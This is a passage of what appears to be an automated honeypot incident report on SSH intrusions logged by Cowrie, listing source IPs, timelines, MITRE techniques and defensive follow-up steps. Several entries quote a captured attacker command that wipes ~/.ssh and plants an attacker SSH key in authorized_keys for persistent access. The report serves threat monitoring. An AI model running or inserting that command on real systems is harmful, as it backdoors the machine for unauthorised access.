| `2026-04-19 14:08:09` | `cowrie.login.success` |
| `2026-04-19 14:08:10` | `cowrie.session.params` |
| `2026-04-19 14:08:10` | `cowrie.command.input` |
| `2026-04-19 14:08:10` | `cowrie.command.failed` |
| `2026-04-19 14:08:10` | `cowrie.log.closed` |
| `2026-04-19 14:08:11` | `cowrie.session.params` |
| `2026-04-19 14:08:11` | `cowrie.command.input` |
| `2026-04-19 14:08:11` | `cowrie.session.file_download` |
| `2026-04-19 14:08:11` | `cowrie.log.closed` |
| `2026-04-19 14:08:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.141.71[.]166` to AbuseIPDB if not already reported
- [ ] Block `187.141.71[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b04effe2a6cb

| Field | Detail |
|---|---|
| **Source IP** | `187.141.71[.]166` |
| **First Seen** | 2026-04-19 14:08 |
| **Last Seen** | 2026-04-19 14:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:08:14` | `cowrie.session.connect` |
| `2026-04-19 14:08:14` | `cowrie.client.version` |
| `2026-04-19 14:08:15` | `cowrie.client.kex` |
| `2026-04-19 14:08:16` | `cowrie.login.success` |
| `2026-04-19 14:08:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.141.71[.]166` to AbuseIPDB if not already reported
- [ ] Block `187.141.71[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c46a9bfa852

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 14:08 |
| **Last Seen** | 2026-04-19 14:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:08:15` | `cowrie.session.connect` |
| `2026-04-19 14:08:15` | `cowrie.client.version` |
| `2026-04-19 14:08:15` | `cowrie.client.kex` |
| `2026-04-19 14:08:17` | `cowrie.login.success` |
| `2026-04-19 14:08:17` | `cowrie.session.params` |
| `2026-04-19 14:08:17` | `cowrie.command.input` |
| `2026-04-19 14:08:17` | `cowrie.command.failed` |
| `2026-04-19 14:08:17` | `cowrie.log.closed` |
| `2026-04-19 14:08:18` | `cowrie.session.params` |
| `2026-04-19 14:08:18` | `cowrie.command.input` |
| `2026-04-19 14:08:18` | `cowrie.session.file_download` |
| `2026-04-19 14:08:18` | `cowrie.log.closed` |
| `2026-04-19 14:08:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3419e3015a51

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 14:08 |
| **Last Seen** | 2026-04-19 14:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:08:21` | `cowrie.session.connect` |
| `2026-04-19 14:08:21` | `cowrie.client.version` |
| `2026-04-19 14:08:21` | `cowrie.client.kex` |
| `2026-04-19 14:08:22` | `cowrie.login.success` |
| `2026-04-19 14:08:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dcb89141816

| Field | Detail |
|---|---|
| **Source IP** | `91.99.110[.]230` |
| **First Seen** | 2026-04-19 14:10 |
| **Last Seen** | 2026-04-19 14:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:10:15` | `cowrie.session.connect` |
| `2026-04-19 14:10:15` | `cowrie.client.version` |
| `2026-04-19 14:10:15` | `cowrie.client.kex` |
| `2026-04-19 14:10:16` | `cowrie.login.success` |
| `2026-04-19 14:10:16` | `cowrie.session.params` |
| `2026-04-19 14:10:16` | `cowrie.command.input` |
| `2026-04-19 14:10:16` | `cowrie.command.failed` |
| `2026-04-19 14:10:16` | `cowrie.log.closed` |
| `2026-04-19 14:10:17` | `cowrie.session.params` |
| `2026-04-19 14:10:17` | `cowrie.command.input` |
| `2026-04-19 14:10:17` | `cowrie.session.file_download` |
| `2026-04-19 14:10:17` | `cowrie.log.closed` |
| `2026-04-19 14:10:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.99.110[.]230` to AbuseIPDB if not already reported
- [ ] Block `91.99.110[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75440e1b9c11

| Field | Detail |
|---|---|
| **Source IP** | `91.99.110[.]230` |
| **First Seen** | 2026-04-19 14:10 |
| **Last Seen** | 2026-04-19 14:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:10:19` | `cowrie.session.connect` |
| `2026-04-19 14:10:19` | `cowrie.client.version` |
| `2026-04-19 14:10:19` | `cowrie.client.kex` |
| `2026-04-19 14:10:20` | `cowrie.login.success` |
| `2026-04-19 14:10:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.99.110[.]230` to AbuseIPDB if not already reported
- [ ] Block `91.99.110[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfd51b8cd8ff

| Field | Detail |
|---|---|
| **Source IP** | `103.189.235[.]33` |
| **First Seen** | 2026-04-19 14:12 |
| **Last Seen** | 2026-04-19 14:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:12:48` | `cowrie.session.connect` |
| `2026-04-19 14:12:48` | `cowrie.client.version` |
| `2026-04-19 14:12:48` | `cowrie.client.kex` |
| `2026-04-19 14:12:48` | `cowrie.login.success` |
| `2026-04-19 14:12:48` | `cowrie.session.params` |
| `2026-04-19 14:12:48` | `cowrie.command.input` |
| `2026-04-19 14:12:48` | `cowrie.command.failed` |
| `2026-04-19 14:12:48` | `cowrie.log.closed` |
| `2026-04-19 14:12:48` | `cowrie.session.params` |
| `2026-04-19 14:12:48` | `cowrie.command.input` |
| `2026-04-19 14:12:48` | `cowrie.session.file_download` |
| `2026-04-19 14:12:48` | `cowrie.log.closed` |
| `2026-04-19 14:12:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.235[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.189.235[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-510622fe4a63

| Field | Detail |
|---|---|
| **Source IP** | `103.189.235[.]33` |
| **First Seen** | 2026-04-19 14:12 |
| **Last Seen** | 2026-04-19 14:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:12:50` | `cowrie.session.connect` |
| `2026-04-19 14:12:50` | `cowrie.client.version` |
| `2026-04-19 14:12:50` | `cowrie.client.kex` |
| `2026-04-19 14:12:50` | `cowrie.login.success` |
| `2026-04-19 14:12:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.235[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.189.235[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8961a36491f4

| Field | Detail |
|---|---|
| **Source IP** | `91.99.110[.]230` |
| **First Seen** | 2026-04-19 14:13 |
| **Last Seen** | 2026-04-19 14:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:13:06` | `cowrie.session.connect` |
| `2026-04-19 14:13:06` | `cowrie.client.version` |
| `2026-04-19 14:13:06` | `cowrie.client.kex` |
| `2026-04-19 14:13:07` | `cowrie.login.success` |
| `2026-04-19 14:13:07` | `cowrie.session.params` |
| `2026-04-19 14:13:07` | `cowrie.command.input` |
| `2026-04-19 14:13:07` | `cowrie.command.failed` |
| `2026-04-19 14:13:07` | `cowrie.log.closed` |
| `2026-04-19 14:13:08` | `cowrie.session.params` |
| `2026-04-19 14:13:08` | `cowrie.command.input` |
| `2026-04-19 14:13:08` | `cowrie.session.file_download` |
| `2026-04-19 14:13:08` | `cowrie.log.closed` |
| `2026-04-19 14:13:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.99.110[.]230` to AbuseIPDB if not already reported
- [ ] Block `91.99.110[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d6fe7cdb612

| Field | Detail |
|---|---|
| **Source IP** | `91.99.110[.]230` |
| **First Seen** | 2026-04-19 14:13 |
| **Last Seen** | 2026-04-19 14:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:13:10` | `cowrie.session.connect` |
| `2026-04-19 14:13:10` | `cowrie.client.version` |
| `2026-04-19 14:13:10` | `cowrie.client.kex` |
| `2026-04-19 14:13:10` | `cowrie.login.success` |
| `2026-04-19 14:13:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.99.110[.]230` to AbuseIPDB if not already reported
- [ ] Block `91.99.110[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5791dc5cefa0

| Field | Detail |
|---|---|
| **Source IP** | `46.101.74[.]113` |
| **First Seen** | 2026-04-19 14:15 |
| **Last Seen** | 2026-04-19 14:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:15:07` | `cowrie.session.connect` |
| `2026-04-19 14:15:07` | `cowrie.client.version` |
| `2026-04-19 14:15:08` | `cowrie.client.kex` |
| `2026-04-19 14:15:08` | `cowrie.login.success` |
| `2026-04-19 14:15:08` | `cowrie.session.params` |
| `2026-04-19 14:15:08` | `cowrie.command.input` |
| `2026-04-19 14:15:08` | `cowrie.command.failed` |
| `2026-04-19 14:15:09` | `cowrie.log.closed` |
| `2026-04-19 14:15:09` | `cowrie.session.params` |
| `2026-04-19 14:15:09` | `cowrie.command.input` |
| `2026-04-19 14:15:09` | `cowrie.session.file_download` |
| `2026-04-19 14:15:09` | `cowrie.log.closed` |
| `2026-04-19 14:15:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.74[.]113` to AbuseIPDB if not already reported
- [ ] Block `46.101.74[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db3863133616

| Field | Detail |
|---|---|
| **Source IP** | `46.101.74[.]113` |
| **First Seen** | 2026-04-19 14:15 |
| **Last Seen** | 2026-04-19 14:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:15:11` | `cowrie.session.connect` |
| `2026-04-19 14:15:11` | `cowrie.client.version` |
| `2026-04-19 14:15:11` | `cowrie.client.kex` |
| `2026-04-19 14:15:12` | `cowrie.login.success` |
| `2026-04-19 14:15:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.74[.]113` to AbuseIPDB if not already reported
- [ ] Block `46.101.74[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c9777a161d4

| Field | Detail |
|---|---|
| **Source IP** | `91.99.110[.]230` |
| **First Seen** | 2026-04-19 14:15 |
| **Last Seen** | 2026-04-19 14:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:15:55` | `cowrie.session.connect` |
| `2026-04-19 14:15:55` | `cowrie.client.version` |
| `2026-04-19 14:15:55` | `cowrie.client.kex` |
| `2026-04-19 14:15:55` | `cowrie.login.success` |
| `2026-04-19 14:15:56` | `cowrie.session.params` |
| `2026-04-19 14:15:56` | `cowrie.command.input` |
| `2026-04-19 14:15:56` | `cowrie.command.failed` |
| `2026-04-19 14:15:56` | `cowrie.log.closed` |
| `2026-04-19 14:15:56` | `cowrie.session.params` |
| `2026-04-19 14:15:56` | `cowrie.command.input` |
| `2026-04-19 14:15:56` | `cowrie.session.file_download` |
| `2026-04-19 14:15:56` | `cowrie.log.closed` |
| `2026-04-19 14:15:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.99.110[.]230` to AbuseIPDB if not already reported
- [ ] Block `91.99.110[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e50261059632

| Field | Detail |
|---|---|
| **Source IP** | `91.99.110[.]230` |
| **First Seen** | 2026-04-19 14:15 |
| **Last Seen** | 2026-04-19 14:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:15:58` | `cowrie.session.connect` |
| `2026-04-19 14:15:58` | `cowrie.client.version` |
| `2026-04-19 14:15:58` | `cowrie.client.kex` |
| `2026-04-19 14:15:59` | `cowrie.login.success` |
| `2026-04-19 14:15:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.99.110[.]230` to AbuseIPDB if not already reported
- [ ] Block `91.99.110[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7356fb86ed70

| Field | Detail |
|---|---|
| **Source IP** | `103.189.235[.]33` |
| **First Seen** | 2026-04-19 14:16 |
| **Last Seen** | 2026-04-19 14:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:16:18` | `cowrie.session.connect` |
| `2026-04-19 14:16:18` | `cowrie.client.version` |
| `2026-04-19 14:16:18` | `cowrie.client.kex` |
| `2026-04-19 14:16:18` | `cowrie.login.success` |
| `2026-04-19 14:16:18` | `cowrie.session.params` |
| `2026-04-19 14:16:18` | `cowrie.command.input` |
| `2026-04-19 14:16:18` | `cowrie.command.failed` |
| `2026-04-19 14:16:18` | `cowrie.log.closed` |
| `2026-04-19 14:16:18` | `cowrie.session.params` |
| `2026-04-19 14:16:18` | `cowrie.command.input` |
| `2026-04-19 14:16:18` | `cowrie.session.file_download` |
| `2026-04-19 14:16:18` | `cowrie.log.closed` |
| `2026-04-19 14:16:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.235[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.189.235[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68e774f4f004

| Field | Detail |
|---|---|
| **Source IP** | `103.189.235[.]33` |
| **First Seen** | 2026-04-19 14:16 |
| **Last Seen** | 2026-04-19 14:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:16:20` | `cowrie.session.connect` |
| `2026-04-19 14:16:20` | `cowrie.client.version` |
| `2026-04-19 14:16:20` | `cowrie.client.kex` |
| `2026-04-19 14:16:20` | `cowrie.login.success` |
| `2026-04-19 14:16:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.235[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.189.235[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-727e99efa119

| Field | Detail |
|---|---|
| **Source IP** | `46.101.74[.]113` |
| **First Seen** | 2026-04-19 14:16 |
| **Last Seen** | 2026-04-19 14:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:16:30` | `cowrie.session.connect` |
| `2026-04-19 14:16:30` | `cowrie.client.version` |
| `2026-04-19 14:16:30` | `cowrie.client.kex` |
| `2026-04-19 14:16:31` | `cowrie.login.success` |
| `2026-04-19 14:16:31` | `cowrie.session.params` |
| `2026-04-19 14:16:31` | `cowrie.command.input` |
| `2026-04-19 14:16:31` | `cowrie.command.failed` |
| `2026-04-19 14:16:31` | `cowrie.log.closed` |
| `2026-04-19 14:16:32` | `cowrie.session.params` |
| `2026-04-19 14:16:32` | `cowrie.command.input` |
| `2026-04-19 14:16:32` | `cowrie.session.file_download` |
| `2026-04-19 14:16:32` | `cowrie.log.closed` |
| `2026-04-19 14:16:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.74[.]113` to AbuseIPDB if not already reported
- [ ] Block `46.101.74[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0aa72c1d0402

| Field | Detail |
|---|---|
| **Source IP** | `46.101.74[.]113` |
| **First Seen** | 2026-04-19 14:16 |
| **Last Seen** | 2026-04-19 14:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:16:34` | `cowrie.session.connect` |
| `2026-04-19 14:16:34` | `cowrie.client.version` |
| `2026-04-19 14:16:34` | `cowrie.client.kex` |
| `2026-04-19 14:16:35` | `cowrie.login.success` |
| `2026-04-19 14:16:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.74[.]113` to AbuseIPDB if not already reported
